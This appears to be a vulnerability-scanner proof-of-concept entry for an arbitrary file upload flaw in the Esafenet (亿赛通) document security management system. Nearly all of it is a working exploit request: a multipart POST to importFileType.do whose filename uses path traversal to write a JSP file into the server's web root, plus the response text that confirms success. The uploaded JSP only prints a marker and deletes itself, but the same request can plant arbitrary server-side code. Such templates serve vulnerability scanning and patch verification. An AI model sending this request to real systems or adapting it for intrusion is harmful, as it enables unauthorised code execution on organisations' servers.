{
        'name': '亿赛通电子文档安全管理系统importFileType任意文件上传漏洞',
        'poc':[{'requests':{
            'method': 'post',
            'payload': '/CDGServer3/fileType/importFileType.do?flag=syn_user_policy',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
                'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarysebeiskw',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close'
            },
            'data': """------WebKitFormBoundarysebeiskw\r\nContent-Disposition: form-data; name="fileshare"; filename="/..\\..\\..\\..\\webapps\\ROOT\\test.jsp"\r\n\r\n<% out.println(1111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>\r\n\r\n------WebKitFormBoundarysebeiskw--""",
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': '{"result":"xmlFail","msg":'
        }}]
    }